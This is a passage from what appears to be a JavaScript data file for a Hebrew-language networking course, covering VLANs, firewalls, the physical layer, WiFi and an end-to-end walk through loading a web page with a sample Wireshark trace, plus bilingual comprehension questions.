              <rect x="10" y="10" width="70" height="35" rx="4" fill="#3a7a4a" stroke="var(--accent-green)"/>
              <text x="45" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 10</text>
              <rect x="90" y="10" width="70" height="35" rx="4" fill="#3a7a4a" stroke="var(--accent-green)"/>
              <text x="125" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 10</text>
              <rect x="170" y="10" width="70" height="35" rx="4" fill="#7a3a3a" stroke="#c06060"/>
              <text x="205" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 20</text>
              <rect x="250" y="10" width="70" height="35" rx="4" fill="#7a3a3a" stroke="#c06060"/>
              <text x="285" y="31" text-anchor="middle" font-size="10" fill="white">VLAN 20</text>
              <line x1="45" y1="45" x2="120" y2="60" stroke="var(--accent-green)" stroke-width="2"/>
              <line x1="125" y1="45" x2="140" y2="60" stroke="var(--accent-green)" stroke-width="2"/>
              <line x1="205" y1="45" x2="180" y2="60" stroke="#c06060" stroke-width="2"/>
              <line x1="285" y1="45" x2="200" y2="60" stroke="#c06060" stroke-width="2"/>
              <line x1="45" y1="45" x2="125" y2="45" stroke="var(--accent-green)" stroke-width="1" stroke-dasharray="4,3"/>
              <line x1="205" y1="45" x2="285" y2="45" stroke="#c06060" stroke-width="1" stroke-dasharray="4,3"/>
              <text x="160" y="130" text-anchor="middle" font-size="9" fill="var(--text-muted)">✅ VLAN 10 ↔ VLAN 10 | ❌ VLAN 10 ↔ VLAN 20</text>
            </svg>
            <p class="diagram-caption">Switch אחד, שתי רשתות לוגיות – לא מדברים בינהן</p>
          </div>
          <p><strong>יתרונות <code>VLAN</code>:</strong></p>
          <ul>
            <li><strong>אבטחה</strong> — מחלקת IT נפרדת ממחלקת הנהלה, למשל</li>
            <li><strong>ביצועים</strong> — <code>Broadcast</code> מוגבל ל-<code>VLAN</code> אחד, לא מציף את כולם</li>
            <li><strong>גמישות</strong> — שינוי <code>VLAN</code> בתוכנה, לא צריך לחבר כבלים מחדש</li>
          </ul>
          <p><strong>תקשורת בין <code>VLAN</code>s</strong></p>
          <p>מחייבת <code>Router</code> או <code>L3 Switch</code> — כי מדובר ברשתות IP שונות.</p>

          <p><strong><code>Trunk</code></strong></p>
          <p>פורט ב-<code>Switch</code> שנושא תעבורת כמה <code>VLAN</code>-ים בו-זמנית.</p>
          <p>משמש לחיבור בין <code>Switch</code>-ים.</p>
          <p>כל <code>Frame</code> שעובר דרך <code>Trunk</code> מקבל תג <code>VLAN</code> לפי תקן <code>802.1Q</code>.</p>
          <p>כך ה-<code>Switch</code> השני יודע לאיזה <code>VLAN</code> הוא שייך.</p>
        `
      },
      {
        type: "explanation",
        title: "Firewall – חומת אש",
        content: `
          <p><strong><code>Firewall</code></strong> — חומת אש</p>
          <p>מנגנון שמסנן תעבורת רשת לפי חוקים.</p>
          <p>מחליט מה מותר לעבור ומה נחסם.</p>

          <p><strong>סוגי <code>Firewall</code>:</strong></p>

          <p><strong><code>Stateless Firewall</code></strong> — <code>Packet Filter</code></p>
          <p>בודק כל חבילה בנפרד לפי <code>IP</code> מקור/יעד, פורט ופרוטוקול.</p>
          <p>לא זוכר מצב של חיבורים קודמים.</p>
          <p>פשוט ומהיר, אבל פחות חכם.</p>

          <p><strong><code>Stateful Firewall</code></strong></p>
          <p>עוקב אחר חיבורים באמצעות <code>State Table</code>.</p>
          <p>אם יצאה בקשה מהרשת הפנימית — התשובה מותרת לחזור אוטומטית.</p>
          <p>ניסיונות חיבור חיצוניים שלא קשורים לבקשה פנימית — נחסמים.</p>

          <p><strong><code>Application Layer Firewall</code></strong> — <code>WAF</code></p>
          <p>מבין את תוכן ה-<code>HTTP</code>.</p>
          <p>חוסם התקפות כמו <code>SQL Injection</code>, <code>XSS</code> ועוד.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 80" class="content-diagram">
              <rect x="10" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="44" text-anchor="middle" font-size="10">רשת פנימית</text>
              <rect x="130" y="15" width="80" height="50" rx="6" fill="#7a3a3a" stroke="#c06060"/>
              <text x="170" y="40" text-anchor="middle" font-size="11" fill="white">Firewall</text>
              <text x="170" y="55" text-anchor="middle" font-size="9" fill="#ffaaaa">חוקים / ACL</text>
              <rect x="250" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="290" y="44" text-anchor="middle" font-size="10">אינטרנט</text>
              <path d="M 90 40 L 130 40" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrowg)"/>
              <path d="M 210 40 L 250 40" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrowg)"/>
              <defs><marker id="arrowg" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker></defs>
            </svg>
            <p class="diagram-caption">Firewall יושב בין הרשת הפנימית לאינטרנט</p>
          </div>
          <p><strong><code>ACL</code></strong> — <code>Access Control List</code></p>
          <p>רשימת חוקי סינון.</p>
          <p><strong>דוגמה:</strong></p>
          <ul>
            <li>"אפשר <code>TCP</code> פורט 443 מכל מקום"</li>
            <li>"חסום <code>UDP</code> פורט 53 מבחוץ"</li>
          </ul>
          <p>הסדר חשוב: הכלל הראשון שמתאים לחבילה הוא זה שקובע.</p>

          <p><strong><code>DMZ</code></strong> — <code>Demilitarized Zone</code></p>
          <p>אזור רשת נפרד המיועד לשרתים ציבוריים — כמו שרת <code>Web</code> ושרת <code>Email</code>.</p>
          <p>ה-<code>DMZ</code> לא נמצא ברשת הפנימית ולא חשוף ישירות לאינטרנט.</p>
          <p>מוגן משני הצדדים.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – רכיבי רשת",
        intro: "<p>שאלות מעניינות על ארכיטקטורת רשת:</p>",
        blocks: [
          {
            title: "מה ההבדל בין Router ביתי לתעשייתי?",
            icon: "🏭",
            content: `<p><strong><code>Router</code> ביתי</strong> — כמו של ספק האינטרנט</p>
              <p>משלב הכל בקופסה אחת: <code>Router</code> + <code>Switch</code> + <code>WiFi AP</code> + <code>NAT</code> + <code>DHCP</code> + <code>Firewall</code> בסיסי.</p>
              <p><strong><code>Router</code> תעשייתי</strong> — <code>Cisco</code>, <code>Juniper</code></p>
              <p>לכל פונקציה מכשיר נפרד: <code>Router</code> נפרד, <code>Managed Switch</code> נפרד, <code>Firewall</code> נפרד, <code>AP</code> נפרד.</p>
              <p><strong>החשיבה:</strong></p>
              <p>בבית — פשטות חשובה יותר מביצועים.</p>
              <p>בחברה — כל רכיב מתמחה, מנוהל בנפרד, ומוחלף בלי להשפיע על האחרים.</p>`
          },
          {
            title: "מה זה SDN – רשת מוגדרת בתוכנה?",
            icon: "💻",
            content: `<p><strong><code>SDN</code></strong> — <code>Software Defined Networking</code></p>
              <p>הפרדה בין ה-<code>Control Plane</code> — שמקבל החלטות ניתוב — ל-<code>Data Plane</code> — שמעביר נתונים בפועל.</p>
              <p>במקום שכל נתב יחליט בעצמו, מרכז <code>SDN</code> אחד שולח הוראות לכל הנתבים.</p>
              <p>כמו <code>GPS</code> מרכזי שמנחה את כל הנהגים.</p>
              <p><code>Google</code> ו-<code>Facebook</code> משתמשים ב-<code>SDN</code> לניהול מרכזי של רשתות ענק.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 9",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>Hub</code> — שכבה 1, משכפל לכולם, ללא כתובות</li>
              <li><code>Switch</code> — שכבה 2, לומד <code>MAC</code>, מעביר רק ליעד. <code>VLAN</code> — חלוקה לוגית של <code>Switch</code></li>
              <li><code>Router</code> — שכבה 3, טבלת ניתוב, מחבר רשתות</li>
              <li><code>Firewall</code> — מסנן תעבורה. <code>Stateless</code> — חבילה בחבילה. <code>Stateful</code> — מעקב חיבורים</li>
              <li><code>DMZ</code> — אזור מוגן לשרתים ציבוריים. <code>ACL</code> — רשימת חוקי סינון</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 9",
        titleEn: "Chapter 9 — Comprehension Questions",
        questions: [
          {
            q: "למה Switch עדיף על Hub?",
            a: "Hub מעביר כל תעבורה לכל הפורטים – יוצר עומס והתנגשויות. Switch מכיר כתובות MAC ויודע לשלוח רק ליעד – חוסך רוחב פס ומפחית התנגשויות.",
            qEn: "Why is a Switch better than a Hub?",
            aEn: "A Hub sends all traffic to all ports — this creates load and collisions. A Switch knows MAC addresses and sends only to the right destination — saving bandwidth and reducing collisions."
          },
          {
            q: "מה ההבדל בין Switch ל-Router?",
            a: "Switch עובד בשכבת הקו – משתמש ב-MAC, מעביר Frames באותה רשת. Router עובד בשכבת הרשת – משתמש ב-IP, מחבר רשתות שונות ומנתב חבילות ביניהן.",
            qEn: "What is the difference between a Switch and a Router?",
            aEn: "A Switch works at the Data Link layer — uses MAC addresses, forwards Frames within the same network. A Router works at the Network layer — uses IP addresses, connects different networks and routes packets between them."
          },
          {
            q: "מה VLAN פותר ולמה לא מספיק רק Firewall?",
            a: "VLAN מפריד ברמת שכבת הקו – broadcast לא חוצה VLANs, מחשב לא יכול אפילו לשלוח Frame לVLAN אחר. Firewall מסנן ברמת IP/TCP אבל broadcast עדיין עובר. VLAN + Firewall = הגנה בשתי שכבות.",
            qEn: "What problem does VLAN solve, and why is a Firewall alone not enough?",
            aEn: "VLAN separates at the Data Link layer — broadcast does not cross VLANs, a computer cannot even send a Frame to another VLAN. A Firewall filters at the IP/TCP level but broadcast still passes through. VLAN + Firewall = protection at two layers."
          },
          {
            q: "מה ההבדל בין Stateless לStateful Firewall?",
            a: "Stateless בודק כל חבילה בנפרד לפי IP/פורט – לא זוכר מצב. Stateful עוקב אחר חיבורים – אם פתחת חיבור פנימה, תשובות מחוץ מותרות אוטומטית. Stateful הרבה יותר חכם – חוסם ניסיונות חיבור חיצוניים לא מורשים.",
            qEn: "What is the difference between a Stateless and a Stateful Firewall?",
            aEn: "Stateless checks each packet separately by IP/port — it does not remember state. Stateful tracks connections — if you opened a connection from inside, replies from outside are allowed automatically. Stateful is much smarter — it blocks unauthorized external connection attempts."
          }
        ]
      }
    ]
  },
  {
    id: 10,
    title: "השכבה הפיזית",
    pages: [
      {
        type: "explanation",
        title: "מטרת השכבה הפיזית",
        content: `
          <p><strong>השכבה הפיזית</strong> — <code>Physical Layer</code></p>
          <p>תפקידה הוא העברת <strong>ביט</strong> בודד — 0 או 1 — בין רכיבים.</p>
          <p>כל השכבות שמעליה מניחות שאפשר להעביר ביטים.</p>
          <p>בשכבה הזו אין מושג של "הודעה" או "חבילה" — רק זרם ביטים.</p>
          <p>השכבה לא יודעת מה תוכן הנתונים שהיא מעבירה.</p>
        `
      },
      {
        type: "explanation",
        title: "טכנולוגיות השכבה הפיזית",
        content: `
          <p>טכנולוגיות שכבה פיזית נפוצות:</p>
          <ul>
            <li><strong>כבל נחושת</strong> — <code>Ethernet</code> — אותות חשמליים</li>
            <li><strong>סיב אופטי</strong> — פולסים של אור</li>
            <li><strong><code>ADSL</code></strong> — תקשורת דרך קו טלפון</li>
            <li><strong><code>WiFi</code></strong> — גלי רדיו</li>
            <li><strong>לווין</strong> — אותות אלקטרומגנטיים</li>
            <li><strong>סלולר</strong> — <code>4G/5G</code> — רשתות אלחוטיות</li>
          </ul>
          <p>כל טכנולוגיה מגדירה תדר, עוצמה, וצורת קידוד.</p>
          <p>כלומר: כל מדיום מגדיר בעצמו כיצד 0 ו-1 מיוצגים פיזית.</p>
        `
      },
      {
        type: "explanation",
        title: "רוחב פס ו־Latency",
        content: `
          <p><strong><code>Bandwidth</code></strong> — רוחב פס</p>
          <p>כמה ביטים אפשר להעביר בשנייה.</p>
          <p>נמדד ב-<code>Mbps</code> או <code>Gbps</code>.</p>

          <p><strong><code>Latency</code></strong> — זמן תגובה</p>
          <p>כמה זמן לוקח לחבילה להגיע מהמקור ליעד.</p>
          <p><strong>דוגמה:</strong></p>
          <ul>
            <li>סיב אופטי — רוחב פס גבוה וזמן תגובה נמוך</li>
            <li>לווין — רוחב פס סביר אבל זמן תגובה גבוה בגלל המרחק</li>
          </ul>

          <p><strong><code>Throughput</code></strong> — קצב בפועל</p>
          <p>קצב ההעברה האמיתי.</p>
          <p>תמיד נמוך מה-<code>Bandwidth</code> התאורטי.</p>
          <p><strong>גורמים שמפחיתים <code>Throughput</code>:</strong></p>
          <ul>
            <li>עומס ברשת</li>
            <li>אובדן חבילות</li>
            <li>שליחה מחדש — <code>Re-transmission</code></li>
            <li>תקורה של פרוטוקולים — <code>Overhead</code></li>
          </ul>

          <p><strong><code>Jitter</code></strong></p>
          <p>שינויים ב-<code>Latency</code> בין חבילות.</p>
          <p>חבילות מגיעות בזמנים לא אחידים.</p>
          <p>בעיה קריטית עבור שמע ווידאו בזמן אמת — כמו <code>VoIP</code> ושיחות <code>Zoom</code>.</p>
        `
      },
      {
        type: "explanation",
        title: "כבלים – סוגים ותקנים",
        content: `
          <p><strong><code>UTP</code></strong> — <code>Unshielded Twisted Pair</code></p>
          <p>כבלי <code>Ethernet</code> מזוגות חוטים מפותלים:</p>
          <table class="content-table">
            <tr><th>קטגוריה</th><th>מהירות</th><th>שימוש</th></tr>
            <tr><td><code>Cat5e</code></td><td>1 Gbps עד 100m</td><td>רשתות ביתיות/משרדיות</td></tr>
            <tr><td><code>Cat6</code></td><td>10 Gbps עד 55m</td><td>מרכזי נתונים</td></tr>
            <tr><td><code>Cat6a</code></td><td>10 Gbps עד 100m</td><td>מרכזי נתונים מודרניים</td></tr>
            <tr><td><code>Cat8</code></td><td>40 Gbps עד 30m</td><td>בין שרתים</td></tr>
          </table>
          <p><strong>סיב אופטי</strong> — <code>Fiber Optic</code></p>
          <p>קיימים שני סוגים:</p>
          <ul>
            <li><strong><code>Single-mode</code></strong> — ליבה דקה, מתאים למרחקים ארוכים עד 100 ק"מ</li>
            <li><strong><code>Multi-mode</code></strong> — ליבה רחבה, מתאים עד 2 ק"מ, זול יותר</li>
          </ul>
          <p><strong>קונקטורים נפוצים:</strong></p>
          <ul>
            <li><code>RJ-45</code> – לכבלי <code>Ethernet</code></li>
            <li><code>LC</code>, <code>SC</code> – לסיב אופטי</li>
            <li><code>SFP</code> – מודולים ניתנים להחלפה ב-<code>Switch</code></li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "WiFi – 802.11 אלחוטי",
        content: `
          <p><strong><code>WiFi</code></strong> — תקן <code>IEEE 802.11</code></p>
          <p>שני תדרים עיקריים:</p>
          <table class="content-table">
            <tr><th>תדר</th><th>טווח</th><th>מהירות</th><th>חסרון</th></tr>
            <tr><td>2.4 GHz</td><td>ארוך יותר</td><td>נמוכה יותר</td><td>עומס – מיקרוגל, <code>Bluetooth</code></td></tr>
            <tr><td>5 GHz</td><td>קצר יותר</td><td>גבוהה יותר</td><td>חוצה קירות פחות טוב</td></tr>
            <tr><td>6 GHz — <code>WiFi 6E</code></td><td>קצר</td><td>גבוהה מאוד</td><td>חדש, פחות מכשירים</td></tr>
          </table>
          <p><strong>דורות <code>WiFi</code>:</strong></p>
          <ul>
            <li><strong><code>WiFi 4</code></strong> — <code>802.11n</code> — עד 600 Mbps — תדרי 2.4+5 GHz</li>
            <li><strong><code>WiFi 5</code></strong> — <code>802.11ac</code> — עד 3.5 Gbps — תדר 5 GHz</li>
            <li><strong><code>WiFi 6</code></strong> — <code>802.11ax</code> — עד 9.6 Gbps — תדרי 2.4+5 GHz</li>
            <li><code>OFDMA</code> — מאפשר יותר מכשירים בו-זמנית</li>
          </ul>
          <p><strong><code>CSMA/CA</code></strong> — <code>Collision Avoidance</code></p>
          <p>ב-<code>WiFi</code> לא ניתן לזהות התנגשויות כמו ב-<code>Ethernet</code>.</p>
          <p>לכן משתמשים בשיטת מניעה:</p>
          <ol>
            <li>כל תחנה מחכה שהאוויר יהיה פנוי</li>
            <li>מוסיפה זמן המתנה אקראי לפני השידור</li>
            <li>אם הגיע <code>ACK</code> מהצד השני – השידור הצליח</li>
          </ol>
          <p><strong><code>SSID</code></strong></p>
          <p>שם הרשת האלחוטית שמוצג למשתמש.</p>
          <p><strong><code>BSSID</code></strong></p>
          <p>כתובת ה-<code>MAC</code> של נקודת הגישה — <code>Access Point</code>.</p>
          <p>ניתן לחבר כמה נקודות גישה עם אותו <code>SSID</code> כדי ליצור רשת אחת גדולה.</p>
          <p>תומכת ב-<code>Roaming</code> — מעבר חלק בין נקודות גישה.</p>
        `
      },
      {
        type: "explanation",
        title: "קידוד – ייצוג ביטים כאותות",
        content: `
          <p>איך מייצגים 0 ו-1 פיזית?</p>
          <p>כל מדיום מגדיר <strong>שיטת קידוד</strong> שונה.</p>
          <p><strong><code>NRZ</code></strong> — <code>Non-Return to Zero</code></p>
          <p>1 = מתח גבוה, 0 = מתח נמוך.</p>
          <p>פשוט, אבל בעייתי ברצפים ארוכים של 0 או 1 — קשה לסנכרון.</p>

          <p><strong><code>Manchester Encoding</code></strong></p>
          <p>כל ביט = מעבר.</p>
          <p>1 = מנמוך לגבוה באמצע הביט.</p>
          <p>0 = מגבוה לנמוך.</p>
          <p>מאפשר סנכרון מובנה.</p>
          <p><code>Ethernet</code> ישן — 10 Mbps — השתמש בשיטה זו.</p>

          <p><strong><code>4B/5B</code></strong></p>
          <p>כל 4 ביטים מקודדים כ-5 ביטים שמבטיחים מינימום מעברים לסנכרון.</p>
          <p>בשימוש ב-<code>Fast Ethernet</code> — 100 Mbps.</p>

          <p><strong><code>PAM4</code></strong> — <code>Pulse Amplitude Modulation</code></p>
          <p>4 רמות מתח — 00, 01, 10, 11 — מכפיל את כמות הנתונים.</p>
          <p><code>400 Gbps Ethernet</code> משתמש בשיטה זו.</p>

          <p><strong>סיב אופטי</strong></p>
          <p><code>ON/OFF</code> של אור — <code>OOK</code> — לקידוד בסיסי.</p>
          <p>מדידת פאזה — <code>QPSK</code>, <code>QAM</code> — לנפחים גדולים.</p>        `
      },
      {
        type: "explanation",
        title: "Full Duplex, Half Duplex ו-CSMA/CD",
        content: `
          <p><strong><code>Half Duplex</code></strong></p>
          <p>תקשורת בכיוון אחד בלבד בכל רגע נתון.</p>
          <p><code>Hub</code> עובד במצב <code>Half Duplex</code>.</p>
          <p>כששתי תחנות שולחות בו-זמנית, הסיגנלים מתנגשים — זו <strong>התנגשות</strong> — <code>Collision</code>.</p>

          <p><strong><code>CSMA/CD</code></strong> — <code>Carrier Sense Multiple Access / Collision Detection</code></p>
          <p>אלגוריתם לטיפול בהתנגשויות ב-<code>Ethernet</code> ישן:</p>
          <ol>
            <li>האזן לפני שאתה שולח — <code>Carrier Sense</code></li>
            <li>שלח אם הקו פנוי</li>
            <li>אם זוהתה התנגשות — עצור, שלח <code>Signal Jam</code></li>
            <li>המתן זמן אקראי — <code>Backoff</code> — ונסה שוב</li>
          </ol>

          <p><strong><code>Full Duplex</code></strong></p>
          <p>שליחה וקבלה בו-זמנית — ללא התנגשויות.</p>
          <p><code>Switch</code> מודרני בשילוב כרטיס רשת מודרני עובדים ב-<code>Full Duplex</code>.</p>
          <p>זה המצב הנפוץ כיום.</p>

          <p><strong><code>Auto-Negotiation</code></strong></p>
          <p>מסדר באופן אוטומטי את המהירות ומצב ה-<code>Duplex</code> בין שני הצדדים.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – השכבה הפיזית",
        intro: "<p>מה באמת קורה בשכבה הכי נמוכה?</p>",
        blocks: [
          {
            title: "כמה מהר נוסע האור בסיב אופטי?",
            icon: "💡",
            content: `<p>מהירות האור בוואקום: 300,000 ק"מ לשנייה.</p>
              <p>בסיב זכוכית: כ-200,000 ק"מ לשנייה — בגלל מקדם שבירה של כ-1.5.</p>
              <p>מישראל לארה"ב, כ-9,000 ק"מ = כ-45ms במהירות האור.</p>
              <p>בפועל: 100–150ms, בגלל נתבים, נתיבים עקיפים ועיכוב עיבוד.</p>
              <p><strong>החשיבה:</strong> הפיזיקה קובעת תקרה ל-<code>Latency</code> – גם עם רשת מושלמת, לא נוכל לרדת מתחת ל-45ms לארה"ב.</p>`
          },
          {
            title: "Power over Ethernet – חשמל דרך כבל רשת",
            icon: "⚡",
            content: `<p><strong><code>PoE</code></strong> — <code>Power over Ethernet</code></p>
              <p>מעביר חשמל ונתונים על אותו כבל <code>Cat5e</code>/<code>Cat6</code>.</p>
              <p>מכשירים כמו נקודות <code>WiFi</code>, טלפוני <code>IP</code> ומצלמות אבטחה יכולים לקבל חשמל ישירות מה-<code>Switch</code>, ללא חיבור חשמל נפרד.</p>
              <p>סוגי <code>PoE</code>:</p>
              <ul>
                <li><strong><code>PoE+</code></strong> – עד 30W</li>
                <li><strong><code>PoE++</code></strong> – עד 60-100W</li>
              </ul>
              <p>לדוגמה: מצלמה בתקרה – כבל אחד עושה הכל.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 10",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבה פיזית = העברת ביט — 0/1. כבלים: <code>Cat5e</code>/<code>Cat6</code> — נחושת. <code>Single</code>/<code>Multi-mode</code> — סיב</li>
              <li><code>WiFi 802.11</code> — 2.4GHz — טווח. 5GHz — מהירות. <code>CSMA/CA</code> — מניעת התנגשויות אלחוטיות</li>
              <li><code>Bandwidth</code> = קצב תיאורטי. <code>Throughput</code> = בפועל. <code>Latency</code> = זמן תגובה. <code>Jitter</code> = שינוי <code>Latency</code></li>
              <li><code>Full Duplex</code> = שליחה + קבלה בו-זמנית — <code>Switch</code> מודרני. <code>Half Duplex</code> = <code>Hub</code>, <code>CSMA/CD</code></li>
              <li>קידוד: <code>NRZ</code>, <code>Manchester</code>, <code>4B/5B</code> — ייצוג ביטים כאותות פיזיים</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 10",
        titleEn: "Chapter 10 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין כבל נחושת לסיב אופטי?",
            a: "נחושת — אותות חשמליים, מושפע מרעש, מרחק מוגבל — כ-100 מטר ל-Ethernet. סיב אופטי — פולסי אור, כמעט ללא רעש, מרחקים ארוכים — Single-mode עד 100 ק'מ — רוחב פס גבוה הרבה יותר.",
            qEn: "What is the difference between copper cable and fiber optic?",
            aEn: "Copper uses electrical signals, is affected by noise, and has limited distance — about 100 meters for Ethernet. Fiber optic uses light pulses, almost no noise, long distances — Single-mode up to 100 km — and much higher bandwidth."
          },
          {
            q: "למה WiFi ב-5GHz מהיר יותר אבל מגיע פחות רחוק?",
            a: "תדר גבוה יותר = גלים קצרים יותר = נחלשים מהר יותר בחומה ובמרחק. אבל תדר גבוה = יותר 'מקום' להעביר נתונים ויותר ערוצים לא חופפים. זה פשרה פיזיקלית — <code>Trade-off</code>.",
            qEn: "Why is 5GHz WiFi faster but has shorter range?",
            aEn: "Higher frequency means shorter waves that weaken faster through walls and distance. But higher frequency also means more room to carry data and more non-overlapping channels. This is a physical trade-off."
          },
          {
            q: "מה ההבדל בין Bandwidth ל-Throughput?",
            a: "Bandwidth = הקצב המקסימלי התיאורטי של הקישור — למשל 1Gbps. Throughput = מה שעובר בפועל — תמיד נמוך בגלל overhead של פרוטוקולים, אובדן חבילות, re-transmission, עומס.",
            qEn: "What is the difference between Bandwidth and Throughput?",
            aEn: "Bandwidth is the maximum theoretical speed of the link — for example 1Gbps. Throughput is what actually passes through — always lower because of protocol overhead, packet loss, retransmission, and load."
          }
        ]
      }
    ]
  },
  {
    id: 11,
    title: "איך הכל מתחבר",
    pages: [
      {
        type: "explanation",
        title: "הסיפור המלא – גלישה ל-Facebook",
        content: `
          <p>כל גלישה לאתר עוברת שמונה שלבים ברצף.</p>
          <p><strong>שלב 1 – <code>DHCP</code></strong></p>
          <p>המחשב מקבל <code>IP</code>, <code>Subnet Mask</code>, <code>Default Gateway</code> ושרת <code>DNS</code>.</p>
          <p>בלי שלב זה לא ניתן לגלוש כלל.</p>
          <p><strong>שלב 2 – <code>DNS</code></strong></p>
          <p>הדפדפן צריך לתרגם את <code>facebook.com</code> לכתובת IP.</p>
          <p>שולח שאילתה לשרת <code>DNS</code> ומקבל בחזרה <code>31.13.72.65</code>.</p>
          <p><strong>שלב 3 – בדיקת <code>Subnet</code></strong></p>
          <p>האם <code>31.13.72.65</code> נמצא ברשת שלנו — למשל <code>192.168.1.x</code>?</p>
          <p>לא — שולחים את החבילה ל-<code>Default Gateway</code> — הנתב.</p>
          <p><strong>שלב 4 – <code>ARP</code></strong></p>
          <p>צריך את כתובת ה-<code>MAC</code> של הנתב.</p>
          <p>שולחים <code>ARP Request</code> ומקבלים את ה-<code>MAC</code> בחזרה.</p>
          <p><strong>שלב 5 – <code>Switch</code></strong></p>
          <p>ה-<code>Switch</code> מעביר את ה-<code>Frame</code> לפי ה-<code>MAC</code> של הנתב.</p>
          <p><strong>שלב 6 – נתבים</strong></p>
          <p>הנתב ומספר נתבים נוספים לאורך הדרך מעבירים את החבילה עד שרתי <code>Facebook</code>.</p>
          <p><strong>שלב 7 – <code>TCP Handshake</code></strong></p>
          <p>מבצעים <code>SYN</code>, <code>SYN-ACK</code>, <code>ACK</code> — החיבור מוכן לשימוש.</p>
          <p><strong>שלב 8 – <code>HTTP GET</code></strong></p>
          <p>הדפדפן שולח בקשת <code>GET</code>.</p>
          <p>השרת מחזיר <code>HTML</code> — הדפדפן מציג את הדף.</p>
        `
      },
      {
        type: "explanation",
        title: "Wireshark – צפייה בסיפור המלא",
        content: `
          <p><strong><code>Wireshark</code></strong></p>
          <p>כשפותחים <code>Wireshark</code> ומבצעים גלישה ל-<code>facebook.com</code>, רואים את כל הפרוטוקולים ברצף.</p>
          <div class="code-preview">
            <pre><code>1  0.000  DHCP Discover (192.168.1.255)  — אם צריך IP
2  0.001  DHCP Offer                     — שרת מציע IP
3  0.015  DNS  Standard query A facebook.com
4  0.045  DNS  Standard query response 31.13.72.65
5  0.046  ARP  Who has 192.168.1.1?      — מי ה-gateway?
6  0.047  ARP  192.168.1.1 is at d4:be:d9:... — MAC של נתב
7  0.048  TCP  [SYN]  → 31.13.72.65:443
8  0.095  TCP  [SYN-ACK] ← 31.13.72.65
9  0.095  TCP  [ACK]
10 0.096  TLS  Client Hello               — TLS Handshake
11 0.145  TLS  Server Hello + Certificate
12 0.148  TLS  Change Cipher Spec         — מוצפן מכאן!
13 0.149  HTTP/2 GET /                    — בקשת הדף
14 0.195  HTTP/2 200 OK + Data</code></pre>
          </div>
          <ul>
            <li>כל שורה ב-<code>Wireshark</code> מייצגת פקטה אחת ברשת.</li>
            <li>הסדר שרואים: <code>DHCP</code> → <code>DNS</code> → <code>ARP</code> → <code>TCP Handshake</code> → <code>TLS</code> → <code>HTTP/2</code>.</li>
            <li>זהו המדריך כולו בפרקטיקה — כל פרק מיוצג בפקטה אחת.</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "סדר הפעולות – מלמטה למעלה",
        content: `
          <p>בשליחת בקשת <code>GET</code>, כל שכבה מוסיפה <code>Header</code>:</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 180" class="content-diagram">
              <rect x="10" y="5" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="22" text-anchor="middle" font-size="10" fill="var(--text)">5. Application: HTTP Header + Data (GET / HTTP/2)</text>
              <rect x="10" y="38" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="55" text-anchor="middle" font-size="10" fill="var(--text)">4. Transport: TCP Header (port 443, seq#, ACK, flags)</text>
              <rect x="10" y="71" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="88" text-anchor="middle" font-size="10" fill="var(--text)">3. Network: IP Header (src IP, dst IP 31.13.72.65, TTL)</text>
              <rect x="10" y="104" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="121" text-anchor="middle" font-size="10" fill="var(--text)">2. Link: Ethernet (src MAC, dst MAC נתב, FCS)</text>
              <rect x="10" y="137" width="320" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="170" y="154" text-anchor="middle" font-size="10" fill="var(--text)">1. Physical: ביטים → כבל / WiFi / סיב</text>
              <path d="M 340 169 L 340 5" stroke="var(--accent-gold)" stroke-width="2" marker-start="url(#arrowUp)" opacity="0.4"/>
              <text x="330" y="95" font-size="8" fill="var(--accent-gold)" transform="rotate(-90, 330, 95)">קבלה: Decapsulation ↑</text>
            </svg>
          </div>
          <p>בקבלה — <code>Decapsulation</code> מלמטה למעלה:</p>
          <ul>
            <li>שכבת הקו מקלפת את <code>Ethernet Header</code></li>
            <li>שכבת הרשת מקלפת את <code>IP Header</code></li>
            <li>שכבת התעבורה מקלפת את <code>TCP Header</code></li>
            <li>עד שמגיעים ל-<code>HTTP Data</code></li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "מה קורה כשהשרת מאחורי CDN",
        content: `
          <p><strong><code>CDN</code></strong> — <code>Content Delivery Network</code></p>
          <p><code>Facebook</code>, <code>Google</code>, <code>Netflix</code> — לא ניגשים ישירות לשרת <code>Origin</code>.</p>
          <ol>
            <li><strong><code>DNS</code></strong> — <code>facebook.com</code> מתרגם ל-<code>IP</code> של <code>CDN Edge Node</code> הקרוב — <code>Anycast</code></li>
            <li><strong><code>TLS Handshake</code></strong> — מתבצע מול ה-<code>Edge Node</code>, לא מול <code>Origin</code>. זמן תגובה קצר!</li>
